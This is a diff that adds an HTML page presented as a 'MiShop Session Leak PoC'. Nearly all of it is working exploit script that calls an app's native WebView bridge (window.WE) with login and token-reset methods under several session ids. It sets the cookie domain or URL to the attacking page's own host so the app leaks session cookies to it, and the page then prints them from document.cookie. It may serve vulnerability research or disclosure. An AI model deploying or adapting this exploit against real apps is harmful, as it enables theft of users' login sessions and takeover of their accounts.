@@ -1,0 +1,80 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>MiShop </title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 12px; }
+    pre { white-space: pre-wrap; word-break: break-word; background: #111; color: #eee; padding: 10px; border-radius: 8px; }
+  </style>
+</head>
+<body>
+  <h2>MiShop Session Leak PoC</h2>
+  <pre id="out">loading...</pre>
+  <script>
+  (function(){
+    var out = document.getElementById('out');
+    function println(s){ out.textContent += '\n' + s; }
+    
+    function callBridge(method, data, eid){
+      var payload = JSON.stringify(data);
+      var ret = {};
+      try { 
+        if (window.WE && WE.triggerString) ret.sync = String(WE.triggerString(method, payload)); 
+      } catch(e) { 
+        ret.sync = 'EX:' + e; 
+      }
+      try { 
+        if (window.WE && WE.trigger) ret.async = String(WE.trigger(method, encodeURIComponent(payload), eid)); 
+      } catch(e) { 
+        ret.async = 'EX:' + e; 
+      }
+      return ret;
+    }
+    
+    function run(){
+      out.textContent = 'MiShop session leak PoC\nurl=' + location.href + '\nWE=' + typeof window.WE;
+      
+      var cases = [
+        {name:'mi_eshopm_domain_attacker', sid:'mi_eshopm', domain:location.hostname, url:location.href},
+        {name:'mi_eshopm_cookieUrl_attacker', sid:'mi_eshopm', cookieUrl:location.href},
+        {name:'miotstore_domain_attacker', sid:'miotstore', domain:location.hostname, url:location.href},
+        {name:'passportapi_domain_attacker', sid:'passportapi', domain:location.hostname, url:location.href}
+      ];
+      
+      var methods = ['loginAndResetToken', 'login_and_reset_token', 'loginandresettoken'];
+      
+      cases.forEach(function(c, i){
+        setTimeout(function(){
+          println('\n--- trigger ' + i + ' ' + c.name + ' ---');
+          println('before cookie=' + document.cookie);
+          
+          methods.forEach(function(m, j){
+            setTimeout(function(){
+              callBridge(m, Object.assign({from:'mishop-session-poc', idx:i, method:m, t:Date.now()}, c), 'poc_'+i+'_'+j);
+            }, j * 250);
+          });
+          
+          setTimeout(function(){
+            println('after cookie=' + document.cookie);
+          }, 2400);
+          
+        }, 1000 + i * 3300);
+      });
+      
+      setTimeout(function(){ 
+        println('\n--- final ---');
+        println('cookie=' + document.cookie); 
+      }, 17000);
+    }
+    
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', run);
+    } else {
+      run();
+    }
+  })();
+  </script>
+</body>
+</html>
